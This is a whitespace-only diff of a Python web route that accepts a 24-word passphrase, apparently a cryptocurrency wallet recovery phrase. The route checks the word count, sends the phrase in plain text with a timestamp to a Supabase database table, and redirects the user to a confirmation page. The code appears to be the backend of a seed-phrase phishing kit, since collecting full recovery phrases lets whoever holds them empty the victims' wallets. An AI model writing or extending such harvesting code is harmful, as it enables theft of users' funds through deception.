@@ -25,29 +25,29 @@ def submit_passphrase():
     if len(words) != 24:
         return "Invalid passphrase. Must be 24 words.", 400
 
-    # Save passphrase to Supabase
-    headers = {
-        "apikey": SUPABASE_KEY,
-        "Authorization": f"Bearer {SUPABASE_KEY}",
-        "Content-Type": "application/json",
-        "Prefer": "return=representation"
-    }
+    # Save passphrase to Supabase  
+    headers = {  
+        "apikey": SUPABASE_KEY,  
+        "Authorization": f"Bearer {SUPABASE_KEY}",  
+        "Content-Type": "application/json",  
+        "Prefer": "return=representation"  
+    }  
 
-    payload = {
-        "passphrase": passphrase,
-        "timestamp": datetime.utcnow().isoformat()
-    }
+    payload = {  
+        "passphrase": passphrase,  
+        "timestamp": datetime.utcnow().isoformat()  
+    }  
 
-    try:
-        response = requests.post(
-            f"{SUPABASE_URL}/rest/v1/{SUPABASE_TABLE}",
-            headers=headers,
-            json=payload
-        )
-        if response.status_code not in [200, 201]:
-            return f"Error saving passphrase: {response.text}", 500
-    except Exception as e:
-        return f"Exception occurred: {e}", 500
+    try:  
+        response = requests.post(  
+            f"{SUPABASE_URL}/rest/v1/{SUPABASE_TABLE}",  
+            headers=headers,  
+            json=payload  
+        )  
+        if response.status_code not in [200, 201]:  
+            return f"Error saving passphrase: {response.text}", 500  
+    except Exception as e:  
+        return f"Exception occurred: {e}", 500  
 
     return redirect("/confirmation")
 
